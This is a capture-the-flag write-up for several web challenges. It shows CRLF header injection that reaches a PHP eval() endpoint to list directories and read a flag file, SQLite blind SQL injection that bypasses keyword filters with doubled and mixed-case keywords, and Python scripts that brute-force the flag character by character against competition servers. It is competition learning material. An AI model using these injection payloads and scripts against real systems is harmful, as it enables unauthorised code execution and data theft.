# CuaaS

Take a look to index.php and cleaner.php

You can see in cleaner.php file uses `eval()` funtion, maybe you need to use it to get flag.

```php
<?php

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){

die("<img src='https://imgur.com/x7BCUsr.png'>");

}


echo "<br>There your cleaned url: ".$_POST['host'];
echo "<br>Thank you For Using our Service!";


function tryandeval($value){
                echo "<br>How many you visited us ";
                eval($value);
        }


foreach (getallheaders() as $name => $value) {
	if ($name == "X-Visited-Before"){
		tryandeval($value);
	}}
?>

```

`eval()` function is only called when `X-Visited-Before` header is in request.

Note that `/cleaner.php` must be accessed from localhost (12.0.0.1). So we need to access it via index.php:

```php
function clean_and_send($url){
			$uncleanedURL = $url; // should be not used anymore
			$values = parse_url($url);
			$host = explode('/',$values['host']);
			$query = $host[0];
			$data = array('host'=>$query);
			echo 'data';
			$cleanerurl = "http://127.0.0.1:9000/cleaner.php";
   			$stream = file_get_contents($cleanerurl, true, stream_context_create(['http' => [
			'method' => 'POST',
			'header' => "X-Original-URL: $uncleanedURL",
			'content' => http_build_query($data)
			]
			]));
    			echo $stream;
    		echo $uncleanedURL;
			}
```

But we can see that there is no `X-Visited-Before` header in request (stream_context_create function) so we need to add it via $uncleanedURL variable (value of url parameter)
. Two headers will be separated by `\r\n`.

So payload for url is something like:

```
url=a%0d%0aX-Visisted-Before:payload;
```

List file in `/`:
```php
url=a%0d%0aX-Visited-Before:var_dump(scandir('/'));
```
![image](https://user-images.githubusercontent.com/83667873/163729406-bd5e981a-3abd-42a0-ba28-e899dac077cb.png)

Read flag:

```php
url=a%0d%0aX-Visited-Before:echo+file_get_contents('/maybethisistheflag');
```

![image](https://user-images.githubusercontent.com/83667873/163729434-9471e559-a49e-46fc-9962-c7741fda968e.png)

# Marvel Pick

After testing, I found that used database is sqlite and we can exploit sqli in character parameter:

![image](https://user-images.githubusercontent.com/83667873/163729601-651ef9c5-d43d-4874-95b1-44bcffd117e7.png)

Here is some filtered words/characters I found (maybe):

`or, select, substr, = , -`

When I enter `or` as input, it returns nothing, so I guess that It will replace `or` which `''`:

![image](https://user-images.githubusercontent.com/83667873/163729782-727a3641-7930-4340-acc6-c5311ace3612.png)

So I try to enter `oorr` and we get `or`. Perfectly, it only replace one time:

![image](https://user-images.githubusercontent.com/83667873/163729863-455970c2-5b06-4aed-b289-fd1deb928004.png)

![image](https://user-images.githubusercontent.com/83667873/163729912-0958284d-2b79-4f77-b9ef-58e7eb1c73c1.png)

Next, we just need to brute to find flag. 

But, note that only only one column return at a time, so I use `limit` to get tables and columns name:

Payload to find tables and columns name:

```
' oorr (unicode(subsubstrstr((seselectlect sql from sqlite_master limit 1,1),{i},1)) like {ord(s)}) union selselectect '1','1
```

![i1](https://user-images.githubusercontent.com/83667873/163730146-155b0741-e98a-4ead-a53e-b94a34a3c0a2.png)

Find flag:

```py
import string
import requests

url = 'http://34.126.83.114:1337/api.php'

partten = string.printable.replace('%','')

def genpayload(i,s):
	return f"' oorr (unicode(subsubstrstr((seselectlect value from flags),{i},1)) like {ord(s)}) union selselectect '1','1"

i=1
foundstr=''
while True:
	for s in partten:
		r = requests.get(url,params={'character':genpayload(i,s)})
		if "\"vote_count\":1}" not in r.text:
			foundstr += s
			print('[+]Found',foundstr)
			break
	i = i+1
```
![i2](https://user-images.githubusercontent.com/83667873/163730162-7e39f780-6751-4946-995c-a898aa472421.png)

# Marvel Pick Again:

This challenge is similar to Marval Pick, but this challenge is limited number of chars;

```py
import requests
import string

url = 'http://34.126.83.114:3390/api.php'
partten = string.printable.replace('%','').replace("'",'')

#Find number chars
for i in range(1,102):
	r = requests.get(url,params={'character':'a'*i})
	if 'No No NO' in r.text:
		print('[+] Found ',i)
		break
```
![image](https://user-images.githubusercontent.com/83667873/163730258-f3abc5fd-99e1-4a02-9938-f7117786bae3.png)

So we can not use payload use in Marvel Pick.

After a few tries, I found that only `or, select` in lowercase are filtered, It means that we can use  `oR, selEct` or something else:

![image](https://user-images.githubusercontent.com/83667873/163730382-6a84742a-b81b-4a8d-8068-c236927bf68d.png)

Too lazy to brute force, I try the same table name and column name with Marvel Pick, and It work :'))).

Script to find flag:

```py
import requests

url = 'http://34.126.83.114:3390/api.php'
partten = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{|}\"#$&\'()*+,-./:;<=>?@[\\]^`{|}~"

def genpayload(i,s):
	return f"' oR (suBstr((sElect value from flags),{i},1) like '{s}') union selecT 1,'1"

i=1
foundstr=''
while True:
	for s in partten:
		r = requests.get(url,params={'character':genpayload(i,s)})
		if "\"vote_count\":1}" not in r.text:
			foundstr += s
			print('[+]Found',foundstr)
			break
	i = i+1
```

# EzChall + EzChall Again
*Note: I solve them after the CTF*

While the CTF is running, I stuck in comparing password. So I cann't solve these challenges. I solve it after read hint in discord.

